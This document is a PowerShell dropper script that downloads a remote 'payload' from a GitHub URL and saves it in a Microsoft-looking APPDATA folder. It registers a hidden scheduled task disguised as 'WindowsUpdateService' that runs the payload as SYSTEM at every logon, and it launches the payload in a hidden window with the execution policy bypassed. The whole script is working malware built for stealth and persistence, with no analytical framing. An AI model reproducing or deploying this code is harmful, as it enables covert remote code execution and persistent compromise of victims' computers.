# bootstrap.ps1 - Persistent installer with offline capability
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$serverIP = "147.185.221.31"
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\batch.ps1"
$payloadUrl = "https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch.ps1"

# 1. Download main payload
$isUpdate = $args -contains "-update"
if (-not (Test-Path $localPayloadPath) -or $isUpdate) {
    try {
        Invoke-WebRequest -Uri $payloadUrl -OutFile $localPayloadPath -UseBasicParsing
        Write-Host "✓ Payload updated successfully" -ForegroundColor Green
    }
    catch {
        if (-not (Test-Path $localPayloadPath)) {
            exit
        }
    }
}

# 2. Create hidden persistence task
$taskName = "WindowsUpdateService"
$taskAction = New-ScheduledTaskAction -Execute "pwsh.exe" -Argument @(
    "-NoLogo",
    "-NoProfile",
    "-WindowStyle Hidden",
    "-ExecutionPolicy Bypass",
    "-File `"$localPayloadPath`""
)
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest
$taskSettings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -DontStopOnIdleEnd

if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    Register-ScheduledTask -TaskName $taskName `
        -Action $taskAction `
        -Trigger $taskTrigger `
        -Principal $taskPrincipal `
        -Settings $taskSettings `
        -Force | Out-Null
}

# 3. Execute payload without creating visible window
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "pwsh.exe"
$psi.Arguments = "-NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($psi) | Out-Null
